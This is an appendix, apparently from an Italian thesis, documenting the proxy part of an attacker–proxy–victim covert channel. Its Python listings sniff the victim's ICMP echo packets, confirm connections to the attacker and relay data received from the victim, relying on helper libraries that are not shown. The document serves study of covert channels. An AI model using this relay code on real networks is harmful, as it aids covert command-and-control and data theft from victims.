\section{Appendice Proxy} \label{appendice:proxy} 


\subsection{Rilevamento degli argomenti passati} 
Per passare degli argomenti tramite linea di comando; 
si usano gli stessi metodi usati dall'attaccante [Code:\ref{script:appendice:attaccante:argomenti}]. 
Tuttavia ciò che cambia sono gli argomenti voluti e la loro tipologia.
\begin{itemize}
    \item In questo caso, tramite \textit{ip\_attaccante}, si richiederà la stringa indicante l'\textbf{IP dell'attaccante}.
\end{itemize}

\subsection{Impostazione dei thread}
Al metodo viene passato in input il metodo per il thread oltrea all'indirizzo IP della vittima.
Dopodichè crea un lock per poter accedere al dizionario che conterrà le risposte dei thread, oltre che 
al dizionario che conterrà i thread stessi.
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={setup_thread}, emphstyle=\color{red} 
    ,emph={[2]thread_lock, thread_response, thread_dict},emphstyle={[2]\color{blue}} 
    ,emph={[3]callback_function, ip_host}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def setup_thread(callback_function,ip_host:ipaddress.IPv4Address): 
    try: 
        if not com.is_IPAddress(ip_host):
            raise Exception("ip_host non ne un IPv4Address")
        if not com.is_callback_function(callback_function):
            raise ValueError("La callback function passata non chiamabile")  
    except Exception as e:
        raise Exception(f"setup_thread: {e}")
   
    thread_lock=threading.Lock()
    print(f"Lock creato:\t{thread_lock}") 
    thread_response={ip_host.compressed:False}
    print(f"Risposte create:\t{thread_response}")
    thread_dict={ip_host.compressed:threading.Thread( target=callback_function)}  
    print(f"Thread creato:\t{thread_dict}")
    return thread_lock, thread_response, thread_dict
\end{lstlisting}
\captionof{lstlisting}{Impostazione dei thread} 
\label{script:appendice:proxy:setupThread} 

\subsection{Confermo la connessione alla vittima}
Il proxy aggiorna l'attaccante sullo stato della connessione con la vittima. 
Lo fa indicando l'IP della vittima, il suo stesso IP e il risultato della connessione. 
Inoltre, nel caso la connessione non sia andata a buon fine, si chiude anche la connessione con l'attaccante. 
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={confirm_conn_of_victim}, emphstyle=\color{red} 
    ,emph={[2]data, socket_attacker},emphstyle={[2]\color{blue}} 
    ,emph={[3]ip_vittima,, ip_host, result}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def confirm_conn_of_victim(ip_vittima, ip_host, socket_attacker, result:bool):
    try: 
        data=com.CONFIRM_VICTIM+ip_vittima+ip_host+str(result)
        socket_attacker.sendall(data.encode()) 
        print(f"Aggiornamento confermato all'attaccante")
        if not result:
            socket_attacker.close()
            raise Exception(f"\t***{ip_host} non connesso a {ip_vittima}") 
        print(f"\t***{ip_host} connesso a {ip_vittima}")  
    except Exception as e: 
        print(f"confirm_conn_to_victim: {e}")
        exit(1) 
\end{lstlisting}
\captionof{lstlisting}{Conferma all'attacante della connessione con la vittima} 
\label{script:appendice:proxy:confirmConn:ofvictim} 

\subsection{Aspetto che la vititma confermi la connessione} 
Dopo aver mandato il messaggio, per la connessione, alla vittima; 
si aspetta una sua risposta di conferma. 
Ciò verrà fatto analizzando il flusso dei dati in arrivo e filtrando quelli provenienti dalla vittima.
Per fare ciò si definiranno gli arogmenti dello sniffer in questo modo: 
\begin{itemize}
    \item Si ricava l'interfaccia sulla quale questo pacchetti viaggeranno. 
    Qui è dove si ascolteranno i dati. 
    \item Dopodichè si definisce il filtro da usare per scremare i pacchetti: 
    \begin{center}
        \footnotesize
        f"icmp and icmp[0]==8 and src {ip\_src} and icmp[4:2]={checksum}"
    \end{center}
    Si filtrano i pachcetti ICMP di tipo Echo Request, provengono dalla vittima e il cui campo identfier combacia con il checksum calcolato precedentemente.
    \item Si definirà anche la funzione di callback usata per processare i pacchetti in arrivo.
\end{itemize} 
Dopodichè si avvia lo sniffer e si aspetta che la vittima risponda. 
Ciò verrà notificato tramite un threadin Event, che verrà attivato in base a due scenari: 
\begin{itemize}
    \item La vittima risponde con un messaggio di conferma 
    \item La vittima ci impiega troppo tempo a rispondere e quindi un timer scadrà. 
    In questo caso si considererà la connessione non confermata. 
\end{itemize}
Se la vittima ha risposto  o no lo si vede dallo stato del time. 
Se è ancora attivo il risultato sarà positivo, altrimenti negativo e quindi la connessione non è stata stabilita. 
Questo risultato verrà memorizzato nel dizionario \textit{thread\_response}. 
Esso ha come chiave l'IP dell'host e come valore il valore booleano indicante lo stato della connessione con la vittima.  
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={wait_conn_from_victim, calc_checksum, get_filter_connection_from_function, callback_wait_conn_from_victim}, emphstyle=\color{red} 
    ,emph={[2]checksum, interface, event_pktconn, args},emphstyle={[2]\color{blue}} 
    ,emph={[3]ip_vittima,, ip_host, result, thread_lock, thread_response, res, confirm_text}, emphstyle={[3]\color{olive}} 
    ,emph={[4]sniffer, pkt_timer},emphstyle={[4]\color{blue}} 
    ,emph={[5]sniff_packet, update_thread_response},emphstyle={[5]\color{red}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def wait_conn_from_victim(ip_vittima,ip_host,thread_lock,thread_response): 
    try:
        confirm_text=com.CONFIRM_VICTIM+ip_vittima+ip_host
        checksum=mymethods.calc_checksum(confirm_text.encode())
        interface,_=mymethods.iface_src_from_IP(ip_vittima)
        event_pktconn=com.get_threading_Event()
        filter=attacksingleton.get_filter_connection_from_function(
            "wait_conn_from_victim"
            ,ip_vittima
            ,checksum
        ) 
    except Exception as e:
        print(f"wait_conn_from_victim filter: {e}")
        return False
    try:
        args={
            "filter":filter 
            ,"prn":callback_wait_conn_from_victim(
                ip_vittima
                ,ip_host
                ,event_pktconn
            ) 
            ,"iface":interface
        } 
        sniffer, pkt_timer=com.sniff_packet(args,event=event_pktconn) 
        com.wait_threading_Event(event_pktconn)
    except Exception as e:
        raise Exception(f"wait_conn_from_victim sniffer: {e}") 
    com.stop_sniffer(sniffer)
    if res:=com.stop_timer(pkt_timer): 
        print(f"La connessione per {ip_vittima} confermata")  
    else: 
        print(f"La connessione per {ip_vittima} non confermata") 
    com.update_thread_response(
        ip_host
        ,thread_lock
        ,thread_response
        ,res
    ) 
    return res
\end{lstlisting}
\captionof{lstlisting}{Connessione con la vittima} 
\label{script:appendice:proxy:waitConn:fromvictim} 
\vspace{2ex} 
La funzione di callback; definisce un sottometodo che richiede come input il pacchetto che lo sniffer ha catturato. 
Dopodichè ritornera questo metodo. 
Ciò viene fatto per poter usare la funzione di callback in modo da poter passare argomenti diversi da quelli che lo sniffer si aspetta. 
Infatti lo sniffer si aspetta un metodo che prende in input un pacchetto, 
mentre si vuole passare anche l'IP della vittima, l'IP dell'host e l'evento; 
che verrà attivato se la connesisone dovesse essere confermata. 
\vspace{1ex} \newline
La funzione di callback, che viene ritornata, verifica se il pacchetto catturato ha determianti layer (in questo caso IP, ICMP e Raw). 
,E se è cosi, calcola il checksum del messaggio di conferma e verifica se combacia con l'identificatore ICMP presente nel pacchetto. 
Inoltre verifica anche che l'indirizzo IP del mittente combaci con quello della vittima. 
\vspace{1ex} \newline
Se entrambe le condizioni sono soddisfatte, allora la connessione è stata confermata e si attiva l'evento.
Dopodichè il metodo ritorna e termina la sua esecuzione. 

\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={callback_wait_conn_from_victim, set_threading_Event}, emphstyle=\color{red} 
    ,emph={[2]pakt, event_pktconn, checksum},emphstyle={[2]\color{blue}} 
    ,emph={[3]ip_vittima, ip_host, confirm_text}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def callback_wait_conn_from_victim(ip_vittima, ip_host, event_pktconn): 
    def callback(pakt):
        print(f"callback wait_conn_from_victim received:{pakt.summary()}") 
        if pakt.haslayer(IP) and pakt.haslayer(ICMP) and pakt.haslayer(Raw): 
            confirm_text=com.CONFIRM_VICTIM+ip_vittima+ip_host
            checksum=mymethods.calc_checksum(confirm_text.encode()) 
            if checksum==pakt[ICMP].id and ip_vittima==pakt[IP].src: 
                print(f"Il pacchetto ha confermato la connessione...") 
                com.set_threading_Event(event_pktconn) 
                return
        print(f"Il pacchetto non ha confermato la connessione...")
    return callback  
\end{lstlisting}
\captionof{lstlisting}{Callback di \textbf{wait\_conn\_from\_victim} [\ref{script:appendice:proxy:waitConn:fromvictim} ]} 
\label{script:appendice:proxy:callback:waitConn:fromvictim} 

\subsection{Aspetto i dati dalla vittima}
Il meotdo che riceve i dati dalla vittima, prende in input l'indirizzo IP della vittima,
l'indirizzo IP dell'attaccante, la funzione di attacco e una lista dove i dati ricevuti verranno memorizzati. 
Dopodichè passerà i dati alla funzione \textit{wait\_data} della libreria \textit{attacksingleton}. 
Sarà quest'ultima a gestire la ricezione dei dati dalla vittima [Code \ref{script:appendice:attacksingleton:waitData} ]. 
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={wait_data_from_vicitm, wait_data}, emphstyle=\color{red} 
    ,emph={[2]data_recvd, information_data},emphstyle={[2]\color{blue}} 
    ,emph={[3]ip_src, ip_dst, attack_func}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def wait_data_from_vicitm(ip_src, ip_dst, attack_func, data_recvd): 
    if not (is_IPaddr(ip_src) and is_dict(attack_func) and is_list(data_recvd)):
        raise Exception(f"Argomenti in input non validi")
    try: 
        print(f"Tramite {attack_func} aspetto che {ip_src} mandi i dati")   
        attacksingleton.wait_data(
            attack_func
            ,ip_src=ip_src
            ,ip_dst=ip_dst
            ,information_data=data_recvd
        )  
    except Exception as e:
        raise Exception(f"wait_data_from_vicitm: {e}") 
\end{lstlisting}
\captionof{lstlisting}{Aspettando i dati dalla vittima} 
\label{script:appendice:proxy:callback:waitData:fromvictim} 

\subsection{Aggiorno la  vittima sulla fine della connessione}
Quando l'attaccante decide di chiudere la connessione, invia alo proxy un comando indicante la cosa. 
Tuttavia il proxy ha una connesisone anchec con la vittima e quindi dovrà aggiornare anche lei. 
Per farlo definisce il messafggio da mandare e lo spedisce tramite il metodo \textbf{send\_packet}. 
\vspace{2ex} 
\begin{lstlisting}[
    language=Python
    ,basicstyle=\footnotesize
    ,firstnumber=0
    ,numbers=left
    ,numberstyle=\tiny
    %
    ,emph={update_victim_end_communication, send_packet}, emphstyle=\color{red} 
    ,emph={[2]data, ip_dst},emphstyle={[2]\color{blue}} 
    ,emph={[3]ip_vittima}, emphstyle={[3]\color{olive}} 
    ,literate={.}{{\char46}}1 {:}{{\char58}}1 
] 
def update_victim_end_communication(ip_vittima):
    if not com.is_IPAddress(ip_vittima):
        raise Exception(f"Argomenti non validi {type(ip_vittima)}") 
    data=com.END_COMMUNICATION
    if com.send_packet(data.encode(),ip_dst=ip_vittima):
        print(f"{ip_vittima}: la vittima stata aggiornata")
        return
    print(f"{ip_vittima}: la vittima non stata aggiornata")
\end{lstlisting}
\captionof{lstlisting}{Aspettando i dati dalla vittima} 
\label{script:appendice:proxy:callback:updateEndComunication} 

